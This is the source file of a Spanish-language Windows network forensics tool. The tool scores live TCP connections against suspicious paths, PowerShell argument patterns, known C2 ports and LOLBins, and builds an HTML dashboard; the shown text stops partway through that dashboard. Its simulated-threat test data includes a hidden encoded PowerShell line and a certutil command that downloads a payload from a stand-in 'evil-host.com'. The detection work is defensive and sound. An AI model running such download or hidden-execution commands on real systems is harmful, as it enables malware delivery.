#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SocketSentry v1.2 | Framework Forense y Hunter de Conexiones de Red, Sockets y C2 en Windows
Desarrollado por: Ezequiel Diaz (Cru9) | https://github.com/Cru9
Parte del Ecosistema WinAudit-DFIR
"""

import os
import sys
import re
import json
import csv
import time
import socket
import datetime
import platform
import subprocess
import html
import ctypes
from pathlib import Path
from typing import Dict, List, Any, Optional

# Habilitar soporte VT100 para colores ANSI en Windows
os.system('')

# Paleta de colores ANSI
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

SCRIPT_DIR = Path(__file__).resolve().parent
REPORTS_DIR = SCRIPT_DIR / "Reportes"
ASSETS_DIR = SCRIPT_DIR / "assets"
DB_PATH = SCRIPT_DIR / "db_conexiones.json"
REPORTS_DIR.mkdir(parents=True, exist_ok=True)
ASSETS_DIR.mkdir(parents=True, exist_ok=True)

try:
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass


def is_admin() -> bool:
    """Verifica si el proceso actual cuenta con privilegios de Administrador."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def request_elevation():
    """Solicita elevación UAC en una nueva ventana si no es administrador."""
    try:
        script = str(Path(__file__).resolve())
        params = f'"{script}"'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] No se pudo solicitar elevación UAC: {e}{RESET}")


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""==============================================================================
   ____             _        _   ____             _              
  / ___|  ___   ___| | _____| |_/ ___|  ___ _ __ | |_ _ __ _   _ 
  \___ \ / _ \ / __| |/ / _ \ __\___ \ / _ \ '_ \| __| '__| | | |
   ___) | (_) | (__|   <  __/ |_ ___) |  __/ | | | |_| |  | |_| |
  |____/ \___/ \___|_|\_\___|\__|____/ \___|_| |_|\__|_|   \__, |
                                                          |___/  
=============================================================================="""
    print(f"{CYAN}{BOLD}{banner}{MAGENTA}")
    print("  Framework Forense de Sockets, C2 Beacon Hunter & Auditoría de Red")
    print("  Ecosistema Cru9 | Windows Network Security Intelligence | v1.2")
    print(f"=============================================================================={RESET}\n")


def is_private_ip(ip: str) -> str:
    """Clasifica la dirección IP remota en Local, Privada (RFC 1918) o WAN Pública."""
    ip = ip.strip()
    if not ip or ip in ["*", "0.0.0.0", "::", "::1", "127.0.0.1", "localhost"]:
        return "Local (Loopback)"
    if ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("169.254."):
        return "Red Privada Local"
    if ip.startswith("172."):
        try:
            second_octet = int(ip.split(".")[1])
            if 16 <= second_octet <= 31:
                return "Red Privada Local"
        except Exception:
            pass
    return "Pública / Internet (EXTERNA)"


def load_threat_database() -> Dict[str, Any]:
    """Carga la base de datos local de IoCs, reglas heurísticas, LOLBins y puertos de malware."""
    if DB_PATH.exists():
        try:
            with open(DB_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"{YELLOW}[!] Aviso al leer db_conexiones.json: {e}. Usando reglas integradas.{RESET}")
    
    # Reglas integradas por defecto si el archivo no existe
    return {
        "Version": "1.2",
        "RutasSospechosas": [
            {"Patron": r"\\AppData\\Local\\Temp", "Puntos": 40, "Motivo": "Ejecutable en carpeta temporal de usuario (%TEMP%)"},
            {"Patron": r"\\Windows\\Temp", "Puntos": 40, "Motivo": "Ejecutable en carpeta temporal del sistema (Windows\\Temp)"},
            {"Patron": r"\\Users\\Public", "Puntos": 35, "Motivo": "Ejecutable en C:\\Users\\Public (directorio de staging de malware)"},
            {"Patron": r"\\AppData\\Roaming", "Puntos": 25, "Motivo": "Ejecutable en AppData Roaming (frecuente en stealers/troyanos)"}
        ],
        "ArgumentosSospechosos": [
            {"Patron": r"(?i)-(enc|encodedcommand)\b", "Puntos": 35, "Motivo": "Comando Base64 ofuscado (-EncodedCommand)"},
            {"Patron": r"(?i)-(w|windowstyle)\s+hidden", "Puntos": 25, "Motivo": "Ejecución oculta en segundo plano (-WindowStyle Hidden)"},
            {"Patron": r"(?i)(downloadstring|downloaddata|iwr\s|invoke-webrequest)", "Puntos": 35, "Motivo": "Cradle de descarga en memoria"}
        ],
        "PuertosMalware": {
            "4444": "Metasploit / Meterpreter Default Listener",
            "1337": "Backdoor Clásico / C2 Hacker",
            "50050": "Cobalt Strike TeamServer Default Port",
            "8888": "C2 HTTP Alternativo / Proxy Malicioso",
            "9999": "Reverse Shell Común"
        },
        "LOLBins": ["powershell.exe", "cmd.exe", "certutil.exe", "bitsadmin.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "wscript.exe", "cscript.exe"]
    }


def get_system_processes() -> Dict[int, Dict[str, str]]:
    """Extrae todos los procesos de Windows con CommandLine y ExecutablePath de forma rápida."""
    procs = {}
    ps_cmd = "Get-CimInstance Win32_Process | Select-Object ProcessId, Name, ExecutablePath, CommandLine | ConvertTo-Json -Compress"
    try:
        res = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True, text=True, errors="replace")
        out = res.stdout.strip()
        if out.startswith("[") or out.startswith("{"):
            data = json.loads(out)
            if isinstance(data, dict):
                data = [data]
            for p in data:
                pid = p.get("ProcessId")
                if pid:
                    procs[int(pid)] = {
                        "Name": p.get("Name") or "Desconocido",
                        "Path": p.get("ExecutablePath") or "-",
                        "CommandLine": p.get("CommandLine") or ""
                    }
    except Exception:
        pass

    # Fallback con tasklist si powershell falló
    if not procs:
        try:
            tl = subprocess.run("tasklist /fo csv /nh", shell=True, capture_output=True, text=True, errors="replace")
            for line in tl.stdout.splitlines():
                parts = [p.strip(' "') for p in line.split('","')]
                if len(parts) >= 2:
                    name, pid_str = parts[0], parts[1]
                    if pid_str.isdigit():
                        procs[int(pid_str)] = {"Name": name, "Path": "-", "CommandLine": ""}
        except Exception:
            pass

    return procs


# ==============================================================================
# CLASE PRINCIPAL: SOCKET SENTRY ENGINE
# ==============================================================================
class SocketSentry:
    def __init__(self, alert_threshold: int = 30):
        self.alert_threshold = alert_threshold
        self.hostname = platform.node()
        self.os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        self.db = load_threat_database()
        self.connections: List[Dict[str, Any]] = []
        self.suspicious_connections: List[Dict[str, Any]] = []
        self.beaconing_history: Dict[str, List[float]] = {}
        self.global_risk_score = 0
        self.global_risk_level = "BAJO"

    def scan_active_sockets(self, include_local: bool = True) -> List[Dict[str, Any]]:
        """Escanea todas las conexiones TCP activas y las correlaciona con procesos y reglas de amenaza."""
        procs = get_system_processes()
        results = []

        try:
            raw_netstat = subprocess.check_output("netstat -ano -p tcp", shell=True, text=True, errors="replace")
        except Exception:
            raw_netstat = ""

        lines = raw_netstat.splitlines()
        for line in lines:
            parts = line.split()
            # Formato netstat: TCP  LocalAddress:Port  ForeignAddress:Port  State  PID
            if len(parts) >= 5 and parts[0].upper() == "TCP":
                local_addr = parts[1]
                foreign_addr = parts[2]
                state = parts[3]
                pid_str = parts[4]

                if not pid_str.isdigit():
                    continue
                pid = int(pid_str)

                # Parsear IP y Puerto remoto
                if ":" in foreign_addr:
                    rem_ip, rem_port = foreign_addr.rsplit(":", 1)
                else:
                    rem_ip, rem_port = foreign_addr, "-"

                # Parsear IP y Puerto local
                if ":" in local_addr:
                    loc_ip, loc_port = local_addr.rsplit(":", 1)
                else:
                    loc_ip, loc_port = local_addr, "-"

                ip_type = is_private_ip(rem_ip)
                if not include_local and ip_type in ["Local (Loopback)", "Red Privada Local"]:
                    continue

                proc_info = procs.get(pid, {"Name": "Desconocido", "Path": "-", "CommandLine": ""})
                proc_name = proc_info["Name"]
                proc_path = proc_info["Path"]
                cmd_line = proc_info["CommandLine"]

                # ==============================================================
                # MOTOR HEURÍSTICO DE AMENAZAS (THREAT SCORING)
                # ==============================================================
                score = 0
                motivos = []

                # 1. Verificación de Puertos de Malware
                ports_list = self.db.get("PuertosSospechosos", [])
                for p_rule in ports_list:
                    if str(p_rule.get("Puerto")) == str(rem_port):
                        pts = p_rule.get("Puntos", 40)
                        amenaza = p_rule.get("Amenaza", "Puerto sospechoso catalogado")
                        score += pts
                        motivos.append(f"Puerto de amenaza conocido ({rem_port} - {amenaza})")
                        break

                # 2. Rutas Sospechosas de Ejecución
                for r_rule in self.db.get("RutasSospechosas", []):
                    pat = r_rule.get("Patron", "")
                    if pat and re.search(pat, proc_path, re.IGNORECASE):
                        pts = r_rule.get("Puntos", 30)
                        score += pts
                        motivos.append(r_rule.get("Motivo", "Ruta sospechosa en disco"))
                        break

                # 3. Argumentos y Comandos Sospechosos
                for a_rule in self.db.get("ArgumentosSospechosos", []):
                    pat = a_rule.get("Patron", "")
                    if pat and re.search(pat, cmd_line, re.IGNORECASE):
                        pts = a_rule.get("Puntos", 30)
                        score += pts
                        motivos.append(a_rule.get("Motivo", "Parámetro sospechoso en línea de comando"))
                        break

                # 4. Binarios LOLBins haciendo conexiones a Internet
                lolbins_rules = self.db.get("LOLBins", [])
                for lb_rule in lolbins_rules:
                    lb_name = lb_rule.get("Nombre", "") if isinstance(lb_rule, dict) else str(lb_rule)
                    if lb_name.lower() == proc_name.lower():
                        pts = lb_rule.get("Puntos", 35) if isinstance(lb_rule, dict) else 35
                        motivo_lb = lb_rule.get("Motivo", f"LOLBin del sistema ({proc_name}) con socket de red") if isinstance(lb_rule, dict) else f"LOLBin ({proc_name}) conectado"
                        if "Pública" in ip_type:
                            score += pts
                            motivos.append(f"{motivo_lb} hacia IP pública ({rem_ip})")
                        elif state == "ESTABLISHED":
                            score += min(pts, 15)
                            motivos.append(f"{motivo_lb} (Socket activo)")
                        break

                # 5. Feodo Tracker / C2 Threat Intelligence
                ioc_dict = self.db.get("IOC_C2_IPs", {})
                if isinstance(ioc_dict, dict) and rem_ip in ioc_dict:
                    c2_data = ioc_dict[rem_ip]
                    malware_name = c2_data.get("Malware", "C2 Desconocido") if isinstance(c2_data, dict) else "C2 Confirmado"
                    score += 85
                    motivos.append(f"ALERTA C2: IP Remota listada en Blacklist ({rem_ip} - Malware: {malware_name})")

                # Clasificación de severidad
                if score >= 60:
                    sev = "CRÍTICA"
                elif score >= self.alert_threshold:
                    sev = "SOSPECHOSA"
                else:
                    sev = "NORMAL"

                results.append({
                    "Protocolo": "TCP",
                    "IPLocal": loc_ip,
                    "PuertoLocal": loc_port,
                    "IPRemota": rem_ip,
                    "PuertoRemoto": rem_port,
                    "ClasificacionIP": ip_type,
                    "Estado": state,
                    "PID": pid,
                    "Proceso": proc_name,
                    "Ruta": proc_path,
                    "LineaComando": cmd_line,
                    "Puntuacion": min(score, 100),
                    "Severidad": sev,
                    "Motivos": motivos,
                    "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })

        self.connections = results
        self.suspicious_connections = [c for c in results if c["Severidad"] in ["CRÍTICA", "SOSPECHOSA"]]
        self.calculate_global_risk()
        return results

    def calculate_global_risk(self):
        """Calcula el puntaje de riesgo de red consolidado."""
        crit_count = len([c for c in self.connections if c["Severidad"] == "CRÍTICA"])
        susp_count = len([c for c in self.connections if c["Severidad"] == "SOSPECHOSA"])

        total_score = (crit_count * 35) + (susp_count * 15)
        self.global_risk_score = min(total_score, 100)

        if self.global_risk_score >= 60:
            self.global_risk_level = "CRÍTICO (Posible intrusión o baliza C2 activa)"
        elif self.global_risk_score >= 25:
            self.global_risk_level = "MEDIO (Conexiones sospechosas detectadas)"
        else:
            self.global_risk_level = "BAJO (Tráfico de red ordinario y confiable)"

    def inject_simulated_threats(self):
        """Inyecta conexiones de prueba realistas para validar el motor de detección."""
        sims = [
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "49512",
                "IPRemota": "185.220.101.5", "PuertoRemoto": "4444", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 7842, "Proceso": "powershell.exe",
                "Ruta": r"C:\Users\User\AppData\Local\Temp\update_worker.exe",
                "LineaComando": "powershell.exe -w hidden -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
                "Puntuacion": 85, "Severidad": "CRÍTICA",
                "Motivos": ["Puerto conocido de malware (4444 - Metasploit Default Listener)", "Ejecutable en carpeta temporal de usuario (%TEMP%)", "Comando Base64 ofuscado (-EncodedCommand)", "LOLBin del sistema conectado a IP pública externa"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "51240",
                "IPRemota": "194.26.29.112", "PuertoRemoto": "50050", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 5120, "Proceso": "rundll32.exe",
                "Ruta": r"C:\Windows\System32\rundll32.exe",
                "LineaComando": r"rundll32.exe C:\Users\Public\beacon.dll,StartW",
                "Puntuacion": 75, "Severidad": "CRÍTICA",
                "Motivos": ["Puerto conocido de malware (50050 - Cobalt Strike TeamServer)", "LOLBin del sistema ('rundll32.exe') conectado a IP pública externa"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "53110",
                "IPRemota": "104.21.55.12", "PuertoRemoto": "8080", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 9924, "Proceso": "certutil.exe",
                "Ruta": r"C:\Windows\System32\certutil.exe",
                "LineaComando": "certutil.exe -urlcache -split -f http://evil-host.com/payload.exe",
                "Puntuacion": 65, "Severidad": "CRÍTICA",
                "Motivos": ["LOLBin del sistema ('certutil.exe') conectado a IP pública externa", "Parámetro sospechoso en línea de comando (-urlcache)"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        ]
        self.connections.extend(sims)
        self.suspicious_connections.extend(sims)
        self.calculate_global_risk()

    def print_cli_summary(self, suspicious_only: bool = False):
        """Muestra un resumen en consola con código de colores estructurado."""
        target_list = self.suspicious_connections if suspicious_only else self.connections
        
        print(f"{CYAN}{BOLD}==============================================================================")
        print(f"               RESUMEN DE AUDITORÍA DE SOCKETS Y RED - CRU9                   ")
        print(f"=============================================================================={RESET}")
        print(f"  {BOLD}Equipo Evaluado:{RESET} {self.hostname} | {BOLD}SO:{RESET} {self.os_info}")
        print(f"  {BOLD}Conexiones Evaluadas:{RESET} {len(self.connections)} | {BOLD}Sospechosas/Críticas:{RESET} {len(self.suspicious_connections)}")
        
        lvl_color = GREEN if "BAJO" in self.global_risk_level else (YELLOW if "MEDIO" in self.global_risk_level else RED)
        print(f"  {BOLD}Índice de Riesgo de Red:{RESET} {lvl_color}{BOLD}{self.global_risk_score}/100 [{self.global_risk_level}]{RESET}")
        print(f"{CYAN}------------------------------------------------------------------------------{RESET}")

        if not target_list:
            print(f"  {GREEN}[✓] No se detectaron conexiones sospechosas ni indicios de C2.{RESET}")
            print(f"{CYAN}=============================================================================={RESET}\n")
            return

        print(f"{'PID':<7} {'PROCESO':<18} {'ESTADO':<12} {'DESTINO':<22} {'SEVERIDAD':<12} {'SCORE'}")
        print(f"{DIM}{'-'*78}{RESET}")

        for c in target_list[:30]:
            dest = f"{c['IPRemota']}:{c['PuertoRemoto']}"
            sev = c["Severidad"]
            sev_color = RED if sev == "CRÍTICA" else (YELLOW if sev == "SOSPECHOSA" else GREEN)
            
            print(f"{c['PID']:<7} {c['Proceso'][:17]:<18} {c['Estado'][:11]:<12} {dest[:21]:<22} {sev_color}{sev:<12}{RESET} {c['Puntuacion']}/100")
            if c["Motivos"]:
                for m in c["Motivos"][:2]:
                    print(f"        {RED}↳ {m}{RESET}")

        if len(target_list) > 30:
            print(f"  {DIM}... y {len(target_list) - 30} conexiones adicionales.{RESET}")
        print(f"{CYAN}=============================================================================={RESET}\n")

    def export_json(self, filepath: Optional[Path] = None) -> Path:
        """Exporta la evidencia forense completa en formato JSON."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Audit_{ts}.json"

        payload = {
            "metadata": {
                "suite": "WinAudit-DFIR",
                "modulo": "SocketSentry (Auditoría de Red y Sockets)",
                "autor": "Cru9",
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": self.hostname,
                "os": self.os_info,
                "total_sockets": len(self.connections),
                "total_sospechosas": len(self.suspicious_connections),
                "risk_score": self.global_risk_score,
                "risk_level": self.global_risk_level
            },
            "conexiones": self.connections
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        return filepath

    def export_csv(self, filepath: Optional[Path] = None) -> Path:
        """Exporta los sockets a formato CSV."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Sockets_{ts}.csv"

        with open(filepath, "w", newline="", encoding="utf-8-sig") as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "PID", "Proceso", "IP_Local", "Puerto_Local", "IP_Remota", "Puerto_Remoto", "Clasificacion_IP", "Estado", "Severidad", "Puntuacion", "Motivos", "Linea_Comando"])
            for c in self.connections:
                writer.writerow([
                    c.get("Timestamp"), c.get("PID"), c.get("Proceso"),
                    c.get("IPLocal"), c.get("PuertoLocal"), c.get("IPRemota"), c.get("PuertoRemoto"),
                    c.get("ClasificacionIP"), c.get("Estado"), c.get("Severidad"), c.get("Puntuacion"),
                    " | ".join(c.get("Motivos", [])), c.get("LineaComando")
                ])
        return filepath

    def generate_html_dashboard(self, filepath: Optional[Path] = None) -> Path:
        """Genera un dashboard interactivo de nivel ejecutivo en HTML/CSS Glassmorphism Cyberpunk."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Dashboard_{ts}.html"

        total_conn = len(self.connections)
        total_susp = len(self.suspicious_connections)
        total_crit = len([c for c in self.connections if c.get("Severidad") == "CRÍTICA"])
        total_lolbins = len([c for c in self.connections if c.get("Proceso", "").lower() in [
            (lb.get("Nombre", "") if isinstance(lb, dict) else str(lb)).lower() for lb in self.db.get("LOLBins", [])
        ]])
        total_external = len([c for c in self.connections if "Pública" in c.get("ClasificacionIP", "")])

        score_color = "#00ff88" if self.global_risk_score < 25 else ("#ffbb00" if self.global_risk_score < 60 else "#ff0055")

        html_content = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WinAudit-DFIR | SocketSentry SOC Network Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {{
            --bg-base: #070914;
            --bg-card: rgba(13, 20, 36, 0.75);
            --border-glass: rgba(157, 78, 221, 0.2);
            --neon-violet: #9d4edd;
            --neon-cyan: #00f0ff;
            --neon-green: #00ff88;
            --neon-red: #ff0055;
            --neon-yellow: #ffbb00;
            --text-main: #f0f4fc;
            --text-muted: #8a99b5;
        }}
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: var(--bg-base);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(157, 78, 221, 0.1) 0%, transparent 45%),
                radial-gradient(circle at 90% 80%, rgba(0, 240, 255, 0.08) 0%, transparent 45%);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            min-height: 100vh;
            padding: 2rem;
        }}
        .container {{ max-width: 1400px; margin: 0 auto; }}

        /* HEADER */
        header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1.5rem 2rem;
            background: var(--bg-card);
            border: 1px solid var(--border-glass);
            border-radius: 16px;
            backdrop-filter: blur(12px);
            margin-bottom: 2rem;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }}
        .brand {{ display: flex; align-items: center; gap: 1rem; }}
        .brand-icon {{
            width: 48px; height: 48px;
            background: linear-gradient(135deg, var(--neon-violet), var(--neon-cyan));
            border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.6rem;
            box-shadow: 0 0 20px rgba(157, 78, 221, 0.4);
        }}
        .brand-text h1 {{ font-size: 1.6rem; font-weight: 800; letter-spacing: -0.5px; }}
        .brand-text h1 span {{ color: var(--neon-violet); }}
        .brand-text p {{ color: var(--text-muted); font-size: 0.85rem; font-family: 'JetBrains Mono', monospace; }}

        .score-box {{
            text-align: right;
            padding: 0.75rem 1.5rem;
            background: rgba(0,0,0,0.4);
            border: 1px solid {score_color};
            border-radius: 12px;
            box-shadow: 0 0 15px {score_color}33;
        }}
        .score-title {{ font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }}
        .score-val {{ font-size: 1.8rem; font-weight: 800; color: {score_color}; }}

        /* KPI METRICS */
        .kpi-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }}
        .kpi-card {{
            background: var(--bg-card);
            border: 1px solid var(--border-glass);
            border-radius: 14px;
            padding: 1.5rem;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }}
        .kpi-card:hover {{
            transform: translateY(-4px);
            border-color: var(--neon-violet);
            box-shadow: 0 10px 25px rgba(157, 78, 221, 0.15);
        }}
        .kpi-card::before {{
            content: '';
            position: absolute;
            top: 0; left: 0; width: 4px; height: 100%;
            background: var(--neon-violet);
        }}
        .kpi-card.alert::before {{ background: var(--neon-red); }}
        .kpi-card.warn::before {{ background: var(--neon-yellow); }}
        .kpi-card.ok::before {{ background: var(--neon-green); }}

        .kpi-label {{ font-size: 0.8rem; text-transform: uppercase; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; margin-bottom: 0.5rem; }}
        .kpi-number {{ font-size: 2.2rem; font-weight: 800; color: var(--text-main); }}
        .kpi-desc {{ font-size: 0.75rem; color: var(--text-muted); margin-top: 0.25rem; }}

        /* MAIN LAYOUT */
        .grid-2 {{
            display: grid;
            grid-template-columns: 2.5fr 1fr;
            gap: 2rem;
            margin-bottom: 2rem;
        }}
        @media (max-width: 992px) {{ .grid-2 {{ grid-template-columns: 1fr; }} }}

        .panel {{
            background: var(--bg-card);
            border: 1px solid var(--border-glass);
            border-radius: 16px;
            padding: 1.5rem;
            backdrop-filter: blur(10px);
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }}
        .panel-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.25rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid rgba(255,255,255,0.06);
        }}
        .panel-header h2 {{ font-size: 1.2rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem; }}

        /* TABLES */
        .search-box {{
            width: 100%;
            padding: 0.75rem 1rem;
            background: rgba(0,0,0,0.5);
            border: 1px solid var(--border-glass);
            border-radius: 8px;
            color: #fff;
            font-family: 'Outfit', sans-serif;
            margin-bottom: 1rem;
        }}
        .table-responsive {{ overflow-x: auto; max-height: 480px; }}
        table {{
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
            font-family: 'JetBrains Mono', monospace;
        }}
        th {{
            background: rgba(157, 78, 221, 0.1);
            color: var(--neon-cyan);
            text-align: left;
            padding: 0.75rem;
            position: sticky; top: 0;
            backdrop-filter: blur(5px);
        }}
        td {{
            padding: 0.75rem;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            color: #d1d9e6;
        }}
        tr:hover td {{ background: rgba(157, 78, 221, 0.04); }}

        .badge {{
            display: inline-block;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.7rem;
            font-weight: 700;
            text-transform: uppercase;
        }}
        .badge-red {{ background: rgba(255,0,85,0.2); color: #ff3377; border: 1px solid #ff0055; }}
        .badge-yellow {{ background: rgba(255,187,0,0.2); color: #ffcc00; border: 1px solid #ffbb00; }}
        .badge-green {{ background: rgba(0,255,136,0.2); color: #00ff88; border: 1px solid #00ff88; }}
        .badge-violet {{ background: rgba(157,78,221,0.2); color: #c77dff; border: 1px solid #9d4edd; }}

        /* MITRE */
        .mitre-list {{ display: flex; flex-direction: column; gap: 0.75rem; }}
        .mitre-item {{
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.05);
            padding: 0.75rem 1rem;
            border-radius: 8px;
        }}
        .mitre-item:hover {{ border-color: var(--neon-violet); }}
        .mitre-id {{ font-family: 'JetBrains Mono', monospace; color: var(--neon-violet); font-weight: 700; }}

        footer {{
            text-align: center;
            color: var(--text-muted);
            font-size: 0.85rem;
            margin-top: 2rem;
            font-family: 'JetBrains Mono', monospace;
        }}
        footer a {{ color: var(--neon-cyan); text-decoration: none; }}
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <header>
            <div class="brand">
                <div class="brand-icon">🌐</div>
                <div class="brand-text">
                    <h1>WinAudit-DFIR <span>SocketSentry</span></h1>
                    <p>Network Socket Forensics, LOLBins & C2 Beacon Threat Hunting | Ecosistema Cru9</p>
                </div>
            </div>
            <div class="score-box">
                <div class="score-title">NIVEL DE RIESGO DE RED</div>
                <div class="score-val">{self.global_risk_score}/100</div>
                <div style="font-size: 0.75rem; color: {score_color}; font-weight: 600;">{self.global_risk_level}</div>
            </div>
        </header>

        <!-- KPIS -->
        <div class="kpi-grid">
            <div class="kpi-card ok">
                <div class="kpi-label">Sockets Activos Evaluados</div>
                <div class="kpi-number">{total_conn}</div>
                <div class="kpi-desc">Conexiones TCP en memoria</div>
            </div>
            <div class="kpi-card {'alert' if total_crit > 0 else 'ok'}">
                <div class="kpi-label">Conexiones Críticas / C2</div>
                <div class="kpi-number">{total_crit}</div>
                <div class="kpi-desc">{'Amenazas activas detectadas' if total_crit > 0 else 'Cero balizas C2 detectadas'}</div>
            </div>
            <div class="kpi-card {'warn' if total_susp > 0 else 'ok'}">
                <div class="kpi-label">Conexiones Sospechosas</div>
                <div class="kpi-number">{total_susp}</div>
                <div class="kpi-desc">Puertos inusuales o heurística</div>
            </div>
            <div class="kpi-card {'warn' if total_lolbins > 0 else 'ok'}">
                <div class="kpi-label">LOLBins del Sistema en Red</div>
                <div class="kpi-number">{total_lolbins}</div>
                <div class="kpi-desc">PowerShell, Certutil, Rundll32...</div>
            </div>
            <div class="kpi-card ok">
                <div class="kpi-label">Conexiones Externas WAN</div>
                <div class="kpi-number">{total_external}</div>
                <div class="kpi-desc">Tráfico hacia Internet pública</div>
            </div>
        </div>

        <!-- MAIN GRID -->
        <div class="grid-2">
            <!-- TABLA DE SOCKETS -->
            <div class="panel">
                <div class="panel-header">
                    <h2><span>⚡</span> Tabla Forense de Conexiones de Red</h2>
                    <span class="badge badge-violet">{len(self.connections)} Sockets</span>
                </div>
                <input type="text" class="search-box" id="tableFilter" placeholder="🔍 Filtrar por Proceso, PID, IP Remota, Puerto o Severidad...">
                <div class="table-responsive">
                    <table id="socketsTable">
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>Proceso</th>
                                <th>IP & Puerto Remoto</th>
                                <th>Estado</th>
                                <th>Severidad</th>
                                <th>Hallazgos / Heurística</th>
                            </tr>
                        </thead>
                        <tbody>
"""
        for c in self.connections:
            sev = c.get("Severidad", "NORMAL")
            badge_cls = "badge-red" if sev == "CRÍTICA" else ("badge-yellow" if sev == "SOSPECHOSA" else "badge-green")
            dest = f"{c.get('IPRemota', '')}:{c.get('PuertoRemoto', '')}"
            motivos_str = " | ".join(c.get("Motivos", [])) or "Conexión estándar confiable"

            html_content += f"""
                            <tr>
                                <td>{c.get('PID', '')}</td>
                                <td style="font-weight:700; color:#fff;">{html.escape(c.get('Proceso', ''))}</td>
                                <td>{html.escape(dest)} <span class="badge badge-violet">{html.escape(c.get('ClasificacionIP', ''))}</span></td>
                                <td>{html.escape(c.get('Estado', ''))}</td>
                                <td><span class="badge {badge_cls}">{sev}</span></td>
                                <td style="font-size:0.75rem; color:#aaa;">{html.escape(motivos_str)}</td>
                            </tr>
"""
        html_content += f"""
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- PANEL MITRE Y REPUTACION -->
            <div class="panel">
                <div class="panel-header">
                    <h2><span>🎯</span> Mapeo MITRE ATT&CK</h2>
                </div>
                <div class="mitre-list">
                    <div class="mitre-item">
                        <div>
                            <div class="mitre-id">T1071.001</div>
                            <div style="font-size:0.8rem; color:#aaa;">Application Layer Protocol (C2)</div>
                        </div>
                        <span class="badge {'badge-red' if total_crit > 0 else 'badge-green'}">{'Detectado' if total_crit > 0 else 'Sin Alertas'}</span>
                    </div>
                    <div class="mitre-item">
                        <div>
                            <div class="mitre-id">T1218</div>
                            <div style="font-size:0.8rem; color:#aaa;">System Binary Proxy Execution (LOLBins)</div>
                        </div>
                        <span class="badge {'badge-yellow' if total_lolbins > 0 else 'badge-green'}">{total_lolbins} Procesos</span>
                    </div>
                    <div class="mitre-item">
                        <div>
                            <div class="mitre-id">T1571</div>
                            <div style="font-size:0.8rem; color:#aaa;">Non-Standard Port Communication</div>
                        </div>
                        <span class="badge {'badge-yellow' if total_susp > 0 else 'badge-green'}">{total_susp} Sockets</span>
                    </div>
                    <div class="mitre-item">
                        <div>
                            <div class="mitre-id">T1105</div>
